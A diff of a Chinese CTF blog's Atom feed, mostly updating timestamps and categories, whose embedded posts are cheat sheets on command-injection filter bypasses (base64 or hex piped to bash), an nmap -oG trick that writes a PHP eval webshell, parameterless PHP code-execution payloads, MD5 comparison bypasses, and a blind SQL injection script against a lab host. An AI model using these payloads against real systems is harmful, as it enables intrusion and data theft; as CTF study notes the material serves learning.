@@ -109,7 +109,7 @@
     <link href="https://sakurahack-y.github.io/2021/10/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     <id>https://sakurahack-y.github.io/2021/10/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
     <published>2021-10-08T15:23:21.439Z</published>
-    <updated>2021-10-08T15:22:44.785Z</updated>
+    <updated>2021-10-08T16:09:27.385Z</updated>
     
     <content type="html"><![CDATA[<p>php调用外部程序常用的函数：<br>system()—执行shell命令也就是向dos发送一条指令。<br>shell_exec() — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。<br>exec() —执行外部程序。<br>passthru() — 执行外部程序并且显示原始输出。</p><p>绕过技巧：<br>一、常见管道符：<br>‘|’ 直接执行后面的语句<br>‘||’ 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>‘&amp;’ 前面和后面命令都要执行，无论前面真假<br>&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令<br>Linux:<br>Linux系统包含了windows系统上面四个之外，还多了一个 ‘;’ 这个作用和 ‘&amp;’ 作用相同<br>二、空格绕过(空格被过滤)：<br>&lt;  –  重定向，如cat&lt;flag.php<br>&lt;&gt;      –   重定向，如cat&lt;&gt;flag.php<br>%09  –  需要php环境，如cat%09flag.php<br>${IFS}  –  单纯cat$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名，如cat${IFS2}flag.php<br>$IFS$9  –  后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串，如cat$IFS2$9flag.php<br>三、黑名单绕过<br>1、拼接<br>a=c;b=at;c=flag;$a$b $c<br>a=c;b=at;c=heb;d=ic;ab{c}{d}<br>2、base64编码<br>echo MTIzCg==|base64 -d 其将会打印123<br>echo “Y2F0IC9mbGFn”|base64-d|bash ==&gt;cat /flag<br>3、hex编码<br>echo “636174202f666c6167” | xxd -r -p|bash ==&gt;cat /flag<br>4、单引号和双引号绕过<br>ca’’t flag 或ca””t flag<br>ca’’t te””st.php<br>5、反斜杠绕过<br>ca\t fl\ag<br>cat te\st.php<br>6、绕过ip中的句点<br>网络地址可以转换成数字地址，比如127.0.0.1可以转化为2130706433。<br>可以直接访问<a href="http://2130706433或者http//0x7F000001%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87.%E7%9A%84ip%E8%BF%87%E6%BB%A4%E3%80%82">http://2130706433或者http://0x7F000001，这样就可以绕过.的ip过滤。</a><br>在线转换地址：数字转IP地址 IP地址转数字 域名转数字IP<br>四、绕过长度限制<br>1，通过&gt;来创建文件</p><blockquote><p>flag.txt<br>2，通过&gt;将命令结果存入文件中<br>echo “hello hacker” &gt; flag.txt<br>3，&gt;&gt;符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容<br>echo “hello hacker” &gt;&gt; flag.txt<br>4、Linux中命令换行<br>在Linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加\，可以将一条命令写在多行。<br>比如：cat flag<br>ca<br>t<br> fla<br>g.txt<br>将命令一条一条输入一个文本中再执行:<br>root@kali:<del># echo “ca\“&gt;cmd<br>root@kali:</del># echo “t\“&gt;&gt;cmd<br>root@kali:<del># echo “ fl\“&gt;&gt;cmd<br>root@kali:</del># echo “ag”&gt;&gt;cmd<br>root@kali:<del># cat cmd<br>ca<br>t<br> fl<br>ag<br>root@kali:</del># sh cmd<br>this is your flag<br>5、ls命令：<br>ls -a 列出文件下所有的文件，包括以“.“开头的隐藏文件（linux下文件隐藏文件是以.开头的，如果存在..代表存在着父目录）。<br>ls -l 列出文件的详细信息，如创建者，创建时间，文件的读写权限列表等等。<br>ls -F 在每一个文件的末尾加上一个字符说明该文件的类型。”@”表示符号链接、”|”表示FIFOS、”/“表示目录、”=”表示套接字。<br>ls -s 在每个文件的后面打印出文件的大小。 size(大小)<br>ls -t 按时间进行文件的排序 Time(时间)<br>ls -A 列出除了”.”和”..”以外的文件。<br>ls -R 将目录下所有的子目录的文件都列出来，相当于我们编程中的“递归”实现<br>ls -L 列出文件的链接名。Link（链接）<br>ls -S 以文件的大小进行排序<br>6、各种读文件命令：<br>cat–由第一行开始显示内容，并将所有内容输出<br>tac–从最后一行倒序显示内容，并将所有内容输出<br>more– 根据窗口大小，一页一页的现实文件内容<br>less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符<br>head– 只显示头几行<br>tail –只显示最后几行<br>nl –类似于cat -n，显示时输出行号<br>tailf– 类似于tail -f<br>vim –使用vim工具打开文本<br>vi –使用vi打开文本cat 由第一行开始显示内容，并将所有内容输出</p></blockquote>]]></content>
     
@@ -123,7 +123,7 @@
     
     <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
     
-    <category term="命令执行" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    <category term="代码\命令执行类" scheme="https://sakurahack-y.github.io/categories/CTF/%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%B1%BB/"/>
     
     
     <category term="命令执行" scheme="https://sakurahack-y.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
@@ -135,7 +135,7 @@
     <link href="https://sakurahack-y.github.io/2021/10/08/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%87%BD%E6%95%B0/"/>
     <id>https://sakurahack-y.github.io/2021/10/08/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%87%BD%E6%95%B0/</id>
     <published>2021-10-08T15:23:21.436Z</published>
-    <updated>2021-10-08T15:22:02.878Z</updated>
+    <updated>2021-10-08T16:00:44.872Z</updated>
     
     <content type="html"><![CDATA[<p> escapeshellarg(string $arg): string<br>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。<br>escapeshellcmd<br> escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</p><p>反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。 </p><p>这两个函数在一起用会有些问题.PS:先用escapeshellarg再用escapeshellcmd才会有这个问题<br>传入的参数是：172.17.0.2’ -v -d a=1<br>经过escapeshellarg处理后变成了’172.17.0.2’&#39;‘ -v -d a=1’，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。<br>经过escapeshellcmd处理后变成’172.17.0.2’\‘’ -v -d a=1&#39;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：<a href="http://php.net/manual/zh/function.escapeshellcmd.php">http://php.net/manual/zh/function.escapeshellcmd.php</a><br>最后执行的命令是curl ‘172.17.0.2’\‘’ -v -d a=1&#39;，由于中间的\被解释为\而不再是转义字符，所以后面的’没有被转义，与再后面的’配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1’，即向172.17.0.2\发起请求，POST 数据为a=1’。</p><p>两次转译后出现了问题，没有考虑到单引号的问题</p><p>nmap命令中 有一个参数-oG可以实现将命令和结果写到文件<br>?host=’ <?php @eval($_POST["hack"]);?> -oG hack.php ‘</p><p>总结当两个函数按这样顺序一起使用，使用过滤就没有意义了</p>]]></content>
     
@@ -149,7 +149,7 @@
     
     <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
     
-    <category term="常用函数" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/"/>
+    <category term="常见函数" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0/"/>
     
     
     <category term="函数" scheme="https://sakurahack-y.github.io/tags/%E5%87%BD%E6%95%B0/"/>
@@ -216,7 +216,7 @@
     <link href="https://sakurahack-y.github.io/2021/10/08/Nmap%E6%96%B9%E9%9D%A2%E7%9A%84%E8%80%83%E5%AF%9F/"/>
     <id>https://sakurahack-y.github.io/2021/10/08/Nmap%E6%96%B9%E9%9D%A2%E7%9A%84%E8%80%83%E5%AF%9F/</id>
     <published>2021-10-08T15:23:21.425Z</published>
-    <updated>2021-10-08T15:19:45.849Z</updated>
+    <updated>2021-10-08T16:07:52.161Z</updated>
     
     <content type="html"><![CDATA[<p>选项 解释<br>-oN 标准保存<br>-oX XML保存<br>-oG Grep保存<br>-oA 保存到所有格式<br>-append-output 补充保存文件<br>-F 实行一次快速扫描<br>选项-oG<br>将结果Grep保存<br>nmap -F -oG test.txt 192.168.23.1<br>nmap命令中 有一个参数-oG可以实现将命令和结果写到文件<br>?host=’ <?php @eval($_POST["hack"]);?> -oG hack.php ‘<br>传入的参数经过了escapeshellarg与escapeshellcmd两个函数的处理，导致在hack.php’这样的情况下会产生hack.php\,解决办法就是在单引号前加空格</p><p>选项-oA<br>该选项可将扫描结果以标准格式、XML格式和Grep格式一次性保存，分别放在.nmap，.xml和.gnmap文件中。<br>nmap -F -oA test 192.168.3.2</p><p>‘ -oN b.phtml <?=eval(\$_POST[a]);?>‘</p>]]></content>
     
@@ -230,7 +230,7 @@
     
     <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
     
-    <category term="代码执行" scheme="https://sakurahack-y.github.io/categories/CTF/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
+    <category term="代码\命令执行类" scheme="https://sakurahack-y.github.io/categories/CTF/%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%B1%BB/"/>
     
     
     <category term="代码执行,nmap" scheme="https://sakurahack-y.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-nmap/"/>
@@ -242,7 +242,7 @@
     <link href="https://sakurahack-y.github.io/2021/10/08/md5%E7%A2%B0%E6%92%9E%E8%84%9A%E6%9C%AC/"/>
     <id>https://sakurahack-y.github.io/2021/10/08/md5%E7%A2%B0%E6%92%9E%E8%84%9A%E6%9C%AC/</id>
     <published>2021-10-08T15:23:21.421Z</published>
-    <updated>2021-10-08T15:19:05.269Z</updated>
+    <updated>2021-10-08T16:05:52.361Z</updated>
     
     <content type="html"><![CDATA[<p>0x04 MD5碰撞脚本<br>授人以鱼不如授人以渔，下面使多线程MD5哈希碰撞脚本，威力巨大。是根据网上代码改编而成，非原创。</p><pre><code># -*- coding: utf-8 -*-import multiprocessingimport hashlibimport randomimport stringimport sysCHARS = string.letters + string.digitsdef cmp_md5(substr, stop_event, str_len,. start=0, size=20):    global CHARS    while not stop_event.is_set():        rnds = &#39;&#39;.join(random.choice(CHARS) for _ in range(size))        md5 = hashlib.md5(rnds)        value = md5.hexdigest()        if value[start: start+str_len] == substr:            print rnds            stop_event.set()            &#39;&#39;&#39;            #碰撞双md5            md5 = hashlib.md5(value)            if md5.hexdigest()[start: start+str_len] == substr:                print rnds+ &quot;=&gt;&quot; + value+&quot;=&gt;&quot;+ md5.hexdigest()  + &quot;\n&quot;                stop_event.set()            &#39;&#39;&#39; if __name__ == &#39;__main__&#39;:    substr = sys.argv[1].strip()    start_pos = int(sys.argv[2]) if len(sys.argv) &gt; 1 else 0    str_len = len(substr)    cpus = multiprocessing.cpu_count()    stop_event = multiprocessing.Event()    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,                                         stop_event, str_len, start_pos))                 for i in range(cpus)]    for p in processes:        p.start()    for p in processes:        p.join()</code></pre><p>上面脚本注释部分是双MD5碰撞，取消注释然后注释掉16行即可。</p><p>使用方法：python md5Crack.py “你要碰撞的字符串” 字符串的起始位置</p><p>例如：python md5Crack.py “0e” 0</p><p>将产生MD5值为0e开头的字符串。</p>]]></content>
     
@@ -259,12 +259,10 @@ import has</summary>
     
     <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
     
-    <category term="绕过" scheme="https://sakurahack-y.github.io/categories/CTF/%E7%BB%95%E8%BF%87/"/>
-    
-    <category term="脚本" scheme="https://sakurahack-y.github.io/categories/CTF/%E7%BB%95%E8%BF%87/%E8%84%9A%E6%9C%AC/"/>
+    <category term="脚本" scheme="https://sakurahack-y.github.io/categories/CTF/%E8%84%9A%E6%9C%AC/"/>
     
     
-    <category term="绕过,md5" scheme="https://sakurahack-y.github.io/tags/%E7%BB%95%E8%BF%87-md5/"/>
+    <category term="脚本" scheme="https://sakurahack-y.github.io/tags/%E8%84%9A%E6%9C%AC/"/>
     
   </entry>
   
@@ -273,7 +271,7 @@ import has</summary>
     <link href="https://sakurahack-y.github.io/2021/10/08/MD5%E6%BC%8F%E6%B4%9E/"/>
     <id>https://sakurahack-y.github.io/2021/10/08/MD5%E6%BC%8F%E6%B4%9E/</id>
     <published>2021-10-08T15:23:21.417Z</published>
-    <updated>2021-10-08T15:18:25.681Z</updated>
+    <updated>2021-10-08T16:05:22.842Z</updated>
     
     <content type="html"><![CDATA[<p>ffifdyop，这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，<br>再转换为字符串：’or’6&lt;乱码&gt;  即  ‘or’66�]��!r,��b<br>这个字符串前几位刚好是 ‘ or ‘6，</p><p>md5(string,raw)</p><p>md5()进行比较时，可以两个里面输入数组，这样都是False,等于，可以绕过</p><p>0e绕过</p><pre><code>0e开头的字符串在参与比较时,会被当做科学计数法,结果转换为0</code></pre><p> 比如将两个md5值进行弱类型比较</p><p>md5(‘QNKCDZO’) == md5(240610708)</p><p>MD5加密后会变成这个样子</p><p>0e830400451993494058024219903391 == 0e462097431906509019562988736854</p><p>由于0e开头的字符串会转换为0,所以真正比较的过程会变成下面这样</p><p>0 == 0</p><p>返回结果为true,也就是说0e开头的md5值进行弱类型比较时,结果相等<br>s878926199a<br>0e545993274517709034328855841020<br>s155964671a<br>0e342768416822451524974117254469<br>s214587387a<br>0e848240448830537924465865611904<br>s214587387a<br>0e848240448830537924465865611904<br>s878926199a<br>0e545993274517709034328855841020</p><p>强类型<br>(string)$_POST[‘a’]!==(string)$_POST[‘b’] &amp;&amp; md5($_POST[‘a’])===md5($_POST[‘b’])<br>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p><p>收录一些MD5值相等的字符串</p><pre><code>$Param1=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;$Param2=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;$data1=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70&quot;;$data2=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70&quot;;</code></pre><p>双md5结果仍为0e开头字符串大全</p><pre><code>MD5大全： CbDLytmyGm2xQyaLNhWn md5(CbDLytmyGm2xQyaLNhWn) =&gt; 0ec20b7c66cafbcc7d8e8481f0653d18 md5(md5(CbDLytmyGm2xQyaLNhWn)) =&gt; 0e3a5f2a80db371d4610b8f940d296af 770hQgrBOjrcqftrlaZk md5(770hQgrBOjrcqftrlaZk) =&gt; 0e689b4f703bdc753be7e27b45cb3625 md5(md5(770hQgrBOjrcqftrlaZk)) =&gt; 0e2756da68ef740fd8f5a5c26cc45064 7r4lGXCH2Ksu2JNT3BYM md5(7r4lGXCH2Ksu2JNT3BYM) =&gt; 0e269ab12da27d79a6626d91f34ae849 md5(md5(7r4lGXCH2Ksu2JNT3BYM)) =&gt; 0e48d320b2a97ab295f5c4694759889f</code></pre><p>md5(‘0e215962017’) ==&gt; “0e291242476940776845150308577824”</p>]]></content>
     
@@ -289,10 +287,8 @@ import has</summary>
     
     <category term="绕过" scheme="https://sakurahack-y.github.io/categories/CTF/%E7%BB%95%E8%BF%87/"/>
     
-    <category term="md5" scheme="https://sakurahack-y.github.io/categories/CTF/%E7%BB%95%E8%BF%87/md5/"/>
     
-    
-    <category term="绕过,md5" scheme="https://sakurahack-y.github.io/tags/%E7%BB%95%E8%BF%87-md5/"/>
+    <category term="绕过" scheme="https://sakurahack-y.github.io/tags/%E7%BB%95%E8%BF%87/"/>
     
   </entry>
   
@@ -301,7 +297,7 @@ import has</summary>
     <link href="https://sakurahack-y.github.io/2021/10/08/%E6%97%A0%E5%8F%82%E6%95%B0rec/"/>
     <id>https://sakurahack-y.github.io/2021/10/08/%E6%97%A0%E5%8F%82%E6%95%B0rec/</id>
     <published>2021-10-08T15:23:21.413Z</published>
-    <updated>2021-10-08T15:23:14.093Z</updated>
+    <updated>2021-10-08T16:09:51.735Z</updated>
     
     <content type="html"><![CDATA[<p>localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.<br>current() 返回数组中的当前单元, 默认取第一个值。<br>pos() current() 的别名<br>current(localeconv())永远都是个点<br>readfile() 输出一个文件。<br>next() 函数将内部指针指向数组中的下一个元素，并输出。<br>array_reverse()以相反的元素顺序返回数组。<br>highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。<br>array_flip()交换数组的键和值<br>array_rand()从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回，本题目中scandir()返回的数组只有5个元素，刷新几次就能刷出来flag.php</p><p>如何读flag.php的源码<br>不能使用file_get_contents()，但是可以可以使用readfile()或highlight_file()以及其别名函数show_source()<br>view-source:<a href="http://172.21.4.12:10031/?exp=print_r(readfile(next(array_reverse(scandir(pos(localeconv()">http://172.21.4.12:10031/?exp=print_r(readfile(next(array_reverse(scandir(pos(localeconv()</a>))))));<br>?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</p><p>?exp=show_source(session_id(session_start()));</p>]]></content>
     
@@ -315,10 +311,10 @@ import has</summary>
     
     <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
     
-    <category term="代码执行" scheme="https://sakurahack-y.github.io/categories/CTF/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
+    <category term="代码\命令执行类" scheme="https://sakurahack-y.github.io/categories/CTF/%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%B1%BB/"/>
     
     
-    <category term="代码执行，无参数rec" scheme="https://sakurahack-y.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%8C%E6%97%A0%E5%8F%82%E6%95%B0rec/"/>
+    <category term="代码执行" scheme="https://sakurahack-y.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
     
   </entry>
   
@@ -405,7 +401,7 @@ import has</summary>
     <link href="https://sakurahack-y.github.io/2021/10/08/%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/"/>
     <id>https://sakurahack-y.github.io/2021/10/08/%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/</id>
     <published>2021-10-08T15:12:23.959Z</published>
-    <updated>2021-10-08T15:11:11.765Z</updated>
+    <updated>2021-10-08T16:08:50.867Z</updated>
     
     <content type="html"><![CDATA[<p>import requests<br>url = ‘<a href="http://9b2dfbf9-7ef6-4104-bb7b-d4aad1150ace.node4.buuoj.cn:81/index.php&#39;">http://9b2dfbf9-7ef6-4104-bb7b-d4aad1150ace.node4.buuoj.cn:81/index.php&#39;</a><br>result = ‘’<br>for i in range(1, 1000):<br>    low = 30<br>    high = 200<br>    mid = (low + high) // 2<br>    while high &gt; low:<br>        payload = “id=0^if((ascii(substr((select(flag)from(flag)),” + str(i) + “,1)))&gt;” + str(mid) + “,1,2)”<br>        print(payload)<br>        data = {<br>            “id”: payload<br>        }<br>        response = requests.post(url, data=data)</p><pre><code>    if &quot;Hello&quot; in response.text:        low = mid+1    else:        high = mid    mid = (low + high) // 2result += chr(int(mid))print(result)</code></pre><p>print(result)</p>]]></content>
     
@@ -419,12 +415,8 @@ import has</summary>
     
     <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
     
-    <category term="SQL" scheme="https://sakurahack-y.github.io/categories/CTF/SQL/"/>
+    <category term="脚本" scheme="https://sakurahack-y.github.io/categories/CTF/%E8%84%9A%E6%9C%AC/"/>
     
-    <category term="脚本" scheme="https://sakurahack-y.github.io/categories/CTF/SQL/%E8%84%9A%E6%9C%AC/"/>
-    
-    
-    <category term="sql" scheme="https://sakurahack-y.github.io/tags/sql/"/>
     
     <category term="脚本" scheme="https://sakurahack-y.github.io/tags/%E8%84%9A%E6%9C%AC/"/>
     
@@ -462,7 +454,7 @@ import has</summary>
     <link href="https://sakurahack-y.github.io/2021/10/08/sql-fuzz%E6%B5%8B%E8%AF%95%E5%AD%97%E5%85%B8/"/>
     <id>https://sakurahack-y.github.io/2021/10/08/sql-fuzz%E6%B5%8B%E8%AF%95%E5%AD%97%E5%85%B8/</id>
     <published>2021-10-08T15:12:23.948Z</published>
-    <updated>2021-10-08T15:11:23.182Z</updated>
+    <updated>2021-10-08T16:08:27.928Z</updated>
     
     <content type="html"><![CDATA[<p>length<br>+<br>handler<br>like<br>select<br>sleep<br>database<br>delete<br>having<br>or<br>as<br>-~<br>BENCHMARK<br>limit<br>left<br>select<br>insert<br>sys.schema_auto_increment_columns<br>join<br>right<br>#<br>&amp;<br>&amp;&amp;<br><br>handler</p><hr><p>–<br>–+<br>INFORMATION<br>–<br>;<br>!<br>%<br>+<br>xor<br>&lt;&gt;<br>(</p><blockquote></blockquote><p>&lt;<br>)<br>.<br>^<br>=<br>AND<br>BY<br>CAST<br>COLUMN<br>COUNT<br>CREATE<br>END<br>case<br>‘1’=’1<br>when<br>admin’<br>“<br>length<br>+<br>length<br>REVERSE<br>ascii<br>select<br>database<br>left<br>right<br>‘<br>union<br>||<br>oorr<br>/<br>//<br>//*<br><em>/</em><br>/**/<br>anandd<br>GROUP<br>HAVING<br>IF<br>INTO<br>JOIN<br>LEAVE<br>LEFT<br>LEVEL<br>sleep<br>LIKE<br>NAMES<br>NEXT<br>NULL<br>OF<br>ON<br>|<br>infromation_schema<br>user<br>OR<br>ORDER<br>ORD<br>SCHEMA<br>SELECT<br>SET<br>TABLE<br>THEN<br>UPDATE<br>USER<br>USING<br>VALUE<br>VALUES<br>WHEN<br>WHERE<br>ADD<br>AND<br>prepare<br>set<br>update<br>delete<br>drop<br>inset<br>CAST<br>COLUMN<br>CONCAT<br>GROUP_CONCAT<br>group_concat<br>CREATE<br>DATABASE<br>DATABASES<br>alter<br>DELETE<br>DROP<br>floor<br>rand()<br>information_schema.tables<br>TABLE_SCHEMA<br>%df<br>concat_ws()<br>concat<br>LIMIT<br>ORD<br>ON<br>extractvalue<br>order<br>CAST()<br>by<br>ORDER<br>OUTFILE<br>RENAME<br>REPLACE<br>SCHEMA<br>SELECT<br>SET<br>updatexml<br>SHOW<br>SQL<br>TABLE<br>THEN<br>TRUE<br>instr<br>benchmark<br>format<br>bin<br>substring<br>ord<br>UPDATE<br>VALUES<br>VARCHAR<br>VERSION<br>WHEN<br>WHERE<br>/*<br>`<br>,<br>users<br>%0a<br>%0b<br>mid<br>for<br>BEFORE<br>REGEXP<br>RLIKE<br>in<br>sys schemma<br>SEPARATOR<br>XOR<br>CURSOR<br>FLOOR<br>sys.schema_table_statistics_with_buffer<br>INFILE<br>count<br>%0c<br>from<br>%0d<br>%a0<br>=<br>@<br>else<br>substr</p>]]></content>
     
@@ -476,12 +468,8 @@ import has</summary>
     
     <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
     
-    <category term="SQL" scheme="https://sakurahack-y.github.io/categories/CTF/SQL/"/>
+    <category term="字典" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%AD%97%E5%85%B8/"/>
     
-    <category term="字典" scheme="https://sakurahack-y.github.io/categories/CTF/SQL/%E5%AD%97%E5%85%B8/"/>
-    
-    
-    <category term="sql" scheme="https://sakurahack-y.github.io/tags/sql/"/>
     
     <category term="字典" scheme="https://sakurahack-y.github.io/tags/%E5%AD%97%E5%85%B8/"/>
     
